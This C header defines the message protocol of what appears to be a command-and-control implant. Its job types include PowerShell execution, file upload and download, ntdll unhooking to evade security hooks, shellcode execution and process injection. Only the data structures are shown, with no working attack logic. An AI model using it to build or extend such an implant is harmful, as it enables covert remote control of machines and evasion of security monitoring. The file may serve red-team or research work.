#pragma once

/*
	Look away.
	I have wielded macros in the most unholy manner.
	I will have to repent for my crimes against C.
	One day, they will catch up.

	I am just a man.
*/

#include "tremont.h"

#define STREAM_PASS_LEN 64

#define SIMPLE_FIN(job_type) struct job_type##_fin_t { uint8_t sanity; }
#define SIMPLE_FAK(job_type) struct job_type##_fak_t { uint8_t sanity; }

#define ALLOWED_RES(job_type) struct job_type##_res_t { uint8_t allowed; }

#define REQ_TEMPLATE_BEGIN(job_type) \
	struct job_type##_req_t {  \
		uint8_t sanity

#define REQ_TEMPLATE_END(job_type) }

#define MSG_TEMPLATE_BEGIN(job_type) \
	struct job_type##_msg_t { \
		enum wrkr_verb_enum_t msg_enum

#define MSG_TEMPLATE_END(job_type) }

enum wrkr_verb_enum_t {
	REQ,
	RES,
	FIN,
	FAK
};

/*
	Control messages are sent on the control stream.

	uint8_t 'allowed' fields are booleans, 1 = true, 0 = false
	uint8_t fields called 'sanity' should be set to one upon creation.
*/

struct _new_stream_info {
	tremont_stream_id stream_id;
	char password[STREAM_PASS_LEN];
};

/* -- POWERSHELL -- */

REQ_TEMPLATE_BEGIN(powershell);
REQ_TEMPLATE_END(powershell);

ALLOWED_RES(powershell);
SIMPLE_FIN(powershell);
SIMPLE_FAK(powershell);

MSG_TEMPLATE_BEGIN(powershell);
union {
	struct powershell_req_t req;
	struct powershell_res_t res;
	struct powershell_fin_t fin;
	struct powershell_fak_t fak;
};
MSG_TEMPLATE_END(powershell);

/* -- UPLOAD: SEND TO ENDPOINT -- */

REQ_TEMPLATE_BEGIN(upload);
char dest_path[255];
size_t dest_path_len;

int64_t file_len;
REQ_TEMPLATE_END(upload);

ALLOWED_RES(upload);
SIMPLE_FIN(upload);
SIMPLE_FAK(upload);

MSG_TEMPLATE_BEGIN(upload);
union {
	struct upload_req_t req;
	struct upload_res_t res;
	struct upload_fin_t fin;
	struct upload_fak_t fak;
};
MSG_TEMPLATE_END(upload);

/* -- DOWNLOAD: GET FROM ENDPOINT -- */

REQ_TEMPLATE_BEGIN(download);
char path[255];
size_t path_len;
REQ_TEMPLATE_END(download);

struct download_res_t { uint8_t allowed; int64_t file_len; };

SIMPLE_FIN(download);
SIMPLE_FAK(download);

MSG_TEMPLATE_BEGIN(download);
union {
	struct download_req_t req;
	struct download_res_t res;
	struct download_fin_t fin;
	struct download_fak_t fak;
};
MSG_TEMPLATE_END(download);

/* -- UNHOOK_L: UNHOOK USING LOCAL NTDLL -- */

REQ_TEMPLATE_BEGIN(unhookl);
REQ_TEMPLATE_END(unhookl);

ALLOWED_RES(unhookl);
SIMPLE_FIN(unhookl);
SIMPLE_FAK(unhookl);

MSG_TEMPLATE_BEGIN(unhookl);
union {
	struct unhookl_req_t req;
	struct unhookl_res_t res;
	struct unhookl_fin_t fin;
	struct unhookl_fak_t fak;
};
MSG_TEMPLATE_END(unhookl);

/* -- UNHOOK_BYON: SEND AN NTDLL TO UNHOOK WITH -- */

REQ_TEMPLATE_BEGIN(unhookbyon);
int64_t file_len;
REQ_TEMPLATE_END(unhookbyon);

ALLOWED_RES(unhookbyon);
SIMPLE_FIN(unhookbyon);
SIMPLE_FAK(unhookbyon);

struct unhookbyon_unhooking_t {
	uint8_t sanity;
};

MSG_TEMPLATE_BEGIN(unhookbyon);
union {
	struct unhookbyon_req_t req;
	struct unhookbyon_res_t res;
	struct unhookbyon_unhooking_t unhooking;
	struct unhookbyon_fin_t fin;
	struct unhookbyon_fak_t fak;
};
MSG_TEMPLATE_END(unhookbyon);

/* -- RUNCODE: UPLOAD AND EXECUTE SHELLCODE -- */

REQ_TEMPLATE_BEGIN(runcode);
int64_t file_len;
REQ_TEMPLATE_END(runcode);

ALLOWED_RES(runcode);
SIMPLE_FIN(runcode);
SIMPLE_FAK(runcode);

struct runcode_running_t {
	uint8_t sanity;
};

MSG_TEMPLATE_BEGIN(runcode);
union {
	struct runcode_req_t req;
	struct runcode_res_t res;
	struct runcode_running_t running;
	struct runcode_fin_t fin;
	struct runcode_fak_t fak;
};
MSG_TEMPLATE_END(runcode);

/* -- PS_T32: ENUM PROCESSES USING Tlhelp32 FUNTIONS -- */

REQ_TEMPLATE_BEGIN(pst32);
REQ_TEMPLATE_END(pst32);

struct pst32_res_t { uint32_t proc_count; };

SIMPLE_FIN(pst32);
SIMPLE_FAK(pst32);

MSG_TEMPLATE_BEGIN(pst32);
union {
	struct pst32_req_t req;
	struct pst32_res_t res;
	struct pst32_fin_t fin;
	struct pst32_fak_t fak;
};
MSG_TEMPLATE_END(pst32);

/* -- INJECT: INJECT A PE INTO ANOTHER PROCESS -- */

REQ_TEMPLATE_BEGIN(inject);
int64_t file_len;
uint32_t pid;
REQ_TEMPLATE_END(inject);

ALLOWED_RES(inject);
SIMPLE_FIN(inject);
SIMPLE_FAK(inject);

MSG_TEMPLATE_BEGIN(inject);
union {
	struct inject_req_t req;
	struct inject_res_t res;
	struct inject_fin_t fin;
	struct inject_fak_t fak;
};
MSG_TEMPLATE_END(inject);

enum wrkr_msg_enum_t {
	POWERSHELL,
	UPLOAD,
	DOWNLOAD,
	UNHOOK_L,
	UNHOOK_BYON,
	RUN_CODE,
	RUN_BIN,
	PS_T32,
	INJECT,
	JOB_QUERY
};

struct wrkr_msg_t {
	enum wrkr_msg_enum_t msg_enum;
	union wrkr_msg_contents {
		struct powershell_msg_t powershell;
		struct upload_msg_t upload;
		struct download_msg_t download;
		struct unhookl_msg_t unhookl;
		struct unhookbyon_msg_t unhookbyon;
		struct runcode_msg_t runcode;
		/*
			struct runbin_msg_t runbin;
		*/
		struct pst32_msg_t pst32;
		struct inject_msg_t inject;
	};
};

enum new_thread_enum_t {
	T_REQ,
	T_RES
};

struct new_thread_msg_t {
	enum new_thread_enum_t new_thread_enum;
	struct _new_stream_info stream_info;
};

struct heartbeat_msg_t {
	uint8_t sanity;
};

struct disconnect_msg_t {
	uint8_t sanity;
};

enum ctrl_msg_enum_t {
	NEW_THREAD,
	HEARTBEAT,
	DISCONNECT,
};

struct ctrl_msg_t {
	enum ctrl_msg_enum_t msg_enum;
	union ctrl_msg_contents {
		struct new_thread_msg_t new_thread;
		struct heartbeat_msg_t heartbeat;
		struct disconnect_msg_t disconnect;
	};
};